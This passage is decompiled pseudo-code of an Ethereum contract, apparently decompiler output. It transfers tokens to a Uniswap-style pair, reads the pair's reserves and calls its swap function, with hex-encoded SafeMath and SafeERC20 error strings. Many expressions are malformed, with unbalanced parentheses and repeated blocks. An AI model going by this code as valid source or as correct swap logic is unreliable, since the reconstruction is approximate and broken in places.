                              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                                   gas gas_remaining wei
                                  args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (20000 * 10^18 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data[32])) - 19940 * 10^18) + 1
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          require return_data.size >= 32
                          require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                          call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                               gas gas_remaining wei
                              args 0, 20 * 10^18, this.address, 128, 0, mem[ceil32(return_data.size) + 489]
                          if not ext_call.success:
                              revert with ext_call.return_data[0 len return_data.size]
                          if ext_call.return_data < 10003 * stor0 / 9970:
                              if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                                  revert with 0, 'Address: call to non-contract'
                              mem[ceil32(return_data.size) + 489 len 64] = 0, 0xd4a11d5eeaac28ec3f61d100daf4d40471f1852, 0
                              call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                                   gas gas_remaining wei
                                  args 0, mem[ceil32(return_data.size) + 425 len 28], mem[ceil32(return_data.size) + 553 len 4]
                              if not return_data.size:
                                  if not ext_call.success:
                                      revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, 10003 * stor0 / 9970
                                  if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                                      revert with 0, 
                                                  32,
                                                  42,
                                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                  mem[ceil32(return_data.size) + 599 len 22]
                              else:
                                  mem[ceil32(return_data.size) + 521 len return_data.size] = ext_call.return_data[0 len return_data.size]
                                  if not ext_call.success:
                                      if return_data.size:
                                          revert with ext_call.return_data[0 len return_data.size]
                                      revert with 0, 'SafeERC20: low-level call failed'
                                  if return_data.size:
                                      require return_data.size >= 32
                                      if not mem[ceil32(return_data.size) + 521]:
                                          revert with 0, 
                                                      32,
                                                      42,
                                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                      mem[(2 * ceil32(return_data.size)) + 600 len 22]
          else:
              # Crazy mathe section lol
              mem[260 len 64] = transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, ext_call.return_data[0 len 28]
              call 0xdac17f958d2ee523a2206206994597c13d831ec7 with:
                 funct Mask(32, 224, '333') >> 224
                   gas gas_remaining wei
                  args Mask(480, -256, ext_call.return_data << 256, mem[324 len 4]
              if not return_data.size:
                  if not ext_call.success:
                      revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, ext_call.return_data[0]
                  if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                      revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[370 len 22]
                  require stor4 + (997 * ext_call.return_data / 1000) - stor0
                  require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                  static call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.getReserves() with:
                          gas gas_remaining wei
                  if not ext_call.success:
                      revert with ext_call.return_data[0 len return_data.size]
                  require return_data.size >= 96
                  if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 <= 0:
                      revert with 0, 32, 44, 0xfe556e697377617056324c6962726172793a20494e53554646494349454e545f4f55545055545f414d4f554e, mem[372 len 20]
                  if ext_call.return_data <= 0:
                      revert with 0, 32, 40, 0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[368 len 24]
                  if ext_call.return_data <= 0:
                      revert with 0, 32, 40, 0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[368 len 24]
                  if not ext_call.return_data[18 len 14]:
                      if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                          revert with 0, 'SafeMath: subtraction overflow'
                      require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                      if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                          revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[425 len 31]
                      require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                      if (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < 0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                          revert with 0, 'SafeMath: addition overflow'
                      require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                      call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                           gas gas_remaining wei
                          args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                  else:
                      if (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data / ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18:
                          revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[361 len 31]
                      if not (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data[18 len 14]):
                          if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                              revert with 0, 'SafeMath: subtraction overflow'
                          require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                          if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                              revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[425 len 31]
                          require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                          if (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < 0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                              revert with 0, 'SafeMath: addition overflow'
                          require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                          call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                               gas gas_remaining wei
                              args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                      else:
                          if (20000 * 10^18 * ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data / (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data[18 len 14]) != 1000:
                              revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[361 len 31]
                          if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                              revert with 0, 'SafeMath: subtraction overflow'
                          require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                          if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                              revert with 0, 32, 33, 0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[425 len 31]
                          require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                          if ((20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < (20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                              revert with 0, 'SafeMath: addition overflow'
                          require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                          call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                               gas gas_remaining wei
                              args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, ((20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                  if not ext_call.success:
                      revert with ext_call.return_data[0 len return_data.size]
                  require return_data.size >= 32
                  require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                  call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                       gas gas_remaining wei
                      args 0, ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18, this.address, 128, 0, mem[488]
                  if not ext_call.success:
                      revert with ext_call.return_data[0 len return_data.size]
                  if ext_call.return_data < 10003 * stor0 / 9970:
                      if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                          revert with 0, 'Address: call to non-contract'
                      mem[488 len 64] = transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 1193220178, Mask(224, 32, (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) >> 32
                      call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                           gas gas_remaining wei
                          args Mask(224, 32, (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) << 224, mem[552 len 4]
                      if not return_data.size:
                          if not ext_call.success:
                              revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, ext_call.return_data[0]
                          if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                              revert with 0, 32, 42, 0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565, mem[598 len 22]
                      else:
                          mem[520 len return_data.size] = ext_call.return_data[0 len return_data.size]
                          if not ext_call.success:
                              if return_data.size:
                                  revert with ext_call.return_data[0 len return_data.size]
                              revert with 0, 'SafeERC20: low-level call failed'
                          if return_data.size:
                              require return_data.size >= 32
                              if not mem[520]:
                                  revert with 0, 
                                              32,
                                              42,
                                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                              mem[ceil32(return_data.size) + 599 len 22]
              else:
                  mem[292 len return_data.size] = ext_call.return_data[0 len return_data.size]
                  if not ext_call.success:
                      if return_data.size:
                          revert with ext_call.return_data[0 len return_data.size]
                      revert with 0, 'SafeERC20: low-level call failed'
                  if not return_data.size:
                      require stor4 + (997 * ext_call.return_data / 1000) - stor0
                      require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                      static call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.getReserves() with:
                              gas gas_remaining wei
                      if not ext_call.success:
                          revert with ext_call.return_data[0 len return_data.size]
                      require return_data.size >= 96
                      if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 <= 0:
                          revert with 0, 
                                      32,
                                      44,
                                      0xfe556e697377617056324c6962726172793a20494e53554646494349454e545f4f55545055545f414d4f554e,
                                      mem[ceil32(return_data.size) + 373 len 20]
                      if ext_call.return_data <= 0:
                          revert with 0, 
                                      32,
                                      40,
                                      0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954,
                                      mem[ceil32(return_data.size) + 369 len 24]
                      if ext_call.return_data <= 0:
                          revert with 0, 
                                      32,
                                      40,
                                      0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954,
                                      mem[ceil32(return_data.size) + 369 len 24]
                      if not ext_call.return_data[18 len 14]:
                          if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                              revert with 0, 'SafeMath: subtraction overflow'
                          require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                          if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                              revert with 0, 
                                          32,
                                          33,
                                          0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                          mem[ceil32(return_data.size) + 426 len 31]
                          require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                          if (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < 0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                              revert with 0, 'SafeMath: addition overflow'
                          require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                          call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                               gas gas_remaining wei
                              args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                      else:
                          if (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data / ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18:
                              revert with 0, 
                                          32,
                                          33,
                                          0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                          mem[ceil32(return_data.size) + 362 len 31]
                          if not (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data[18 len 14]):
                              if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                                  revert with 0, 'SafeMath: subtraction overflow'
                              require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                              if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 426 len 31]
                              require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                              if (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < 0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                                  revert with 0, 'SafeMath: addition overflow'
                              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                                   gas gas_remaining wei
                                  args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, (0 / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                          else:
                              if (20000 * 10^18 * ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data / (20 * 10^18 * ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * ext_call.return_data[18 len 14]) != 1000:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 362 len 31]
                              if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                                  revert with 0, 'SafeMath: subtraction overflow'
                              require Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18
                              if (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18 / Mask(112, 0, ext_call.return_data * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 20 * 10^18 != 997:
                                  revert with 0, 
                                              32,
                                              33,
                                              0x59536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                              mem[ceil32(return_data.size) + 426 len 31]
                              require (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18
                              if ((20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1 < (20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18:
                                  revert with 0, 'SafeMath: addition overflow'
                              require ext_code.size(0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)
                              call 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.transfer(address to, uint256 value) with:
                                   gas gas_remaining wei
                                  args 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc, ((20000 * 10^18 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997 * Mask(112, 0, ext_call.return_data / (997 * Mask(112, 0, ext_call.return_data * (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) - 19940 * 10^18) + 1
                      if not ext_call.success:
                          revert with ext_call.return_data[0 len return_data.size]
                      require return_data.size >= 32
                      require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                      call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.0x22c0d9f with:
                           gas gas_remaining wei
                          args 0, ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18, this.address, 128, 0, mem[ceil32(return_data.size) + 489]
                      if not ext_call.success:
                          revert with ext_call.return_data[0 len return_data.size]
                      if ext_call.return_data < 10003 * stor0 / 9970:
                          if not ext_code.size(0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2):
                              revert with 0, 'Address: call to non-contract'
                          mem[ceil32(return_data.size) + 489 len 64] = transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, Mask(224, 32, (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) >> 32
                          call 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2.0x471f1852 with:
                               gas gas_remaining wei
                              args Mask(224, 32, (1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) << 224, mem[ceil32(return_data.size) + 553 len 4]
                          if not return_data.size:
                              if not ext_call.success:
                                  revert with transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10, 0, ext_call.return_data[0]
                              if not transfer(address to, uint256 value), 0xd4a11d5eeaac28ec3f61d10:
                                  revert with 0, 
                                              32,
                                              42,
                                              0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                              mem[ceil32(return_data.size) + 599 len 22]
                          else:
                              mem[ceil32(return_data.size) + 521 len return_data.size] = ext_call.return_data[0 len return_data.size]
                              if not ext_call.success:
                                  if return_data.size:
                                      revert with ext_call.return_data[0 len return_data.size]
                                  revert with 0, 
                                              'SafeERC20: low-level call failed',
                                              mem[(2 * ceil32(return_data.size)) + 590 len (2 * ceil32(return_data.size)) - (2 * ceil32(return_data.size))]
                              if return_data.size:
                                  require return_data.size >= 32
                                  if not mem[ceil32(return_data.size) + 521]:
                                      revert with 0, 
                                                  32,
                                                  42,
                                                  0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                                  mem[(2 * ceil32(return_data.size)) + 600 len (2 * ceil32(return_data.size)) + (-2 * ceil32(return_data.size)) + 22]
                  else:
                      require return_data.size >= 32
                      if not mem[292]:
                          revert with 0, 
                                      32,
                                      42,
                                      0x775361666545524332303a204552433230206f7065726174696f6e20646964206e6f7420737563636565,
                                      mem[ceil32(return_data.size) + 371 len 22]
                      require stor4 + (997 * ext_call.return_data / 1000) - stor0
                      require ext_code.size(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc)
                      static call 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc.getReserves() with:
                              gas gas_remaining wei
                      if not ext_call.success:
                          revert with ext_call.return_data[0 len return_data.size]
                      require return_data.size >= 96
                      if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 <= 0:
                          revert with 0, 
                                      32,
                                      44,
                                      0xfe556e697377617056324c6962726172793a20494e53554646494349454e545f4f55545055545f414d4f554e,
                                      mem[ceil32(return_data.size) + 373 len 20]
                      if ext_call.return_data <= 0:
                          revert with 0, 
                                      32,
                                      40,
                                      0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954,
                                      mem[ceil32(return_data.size) + 369 len 24]
                      if ext_call.return_data <= 0:
                          revert with 0, 
                                      32,
                                      40,
                                      0x54556e697377617056324c6962726172793a20494e53554646494349454e545f4c49515549444954,
                                      mem[ceil32(return_data.size) + 369 len 24]
                      if not ext_call.return_data[18 len 14]:
                          if ((1001 * stor0 * stor3) - (1001 * 997 * ext_call.return_data / 1000 * stor3) / stor4 + (997 * ext_call.return_data / 1000) - stor0 / 997) + 20 * 10^18 > Mask(112, 0, ext_call.return_data[32]):
                              revert with 0, 'SafeMath: subtraction overflow'
